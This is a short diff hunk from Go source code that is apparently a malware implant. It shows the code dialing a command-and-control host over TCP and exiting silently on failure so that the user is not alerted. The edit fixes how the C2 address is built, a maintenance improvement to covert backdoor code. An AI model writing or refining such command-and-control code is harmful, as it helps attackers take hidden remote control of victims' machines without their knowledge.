@@ -24,7 +24,7 @@ func main() {
 	}
 
 	// Connect to C2
-	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", c2Host, c2PortStr))
+	conn, err := net.Dial("tcp", net.JoinHostPort(c2Host, c2PortStr))
 	if err != nil {
 		// Silent fail - don't alert user
 		os.Exit(1)
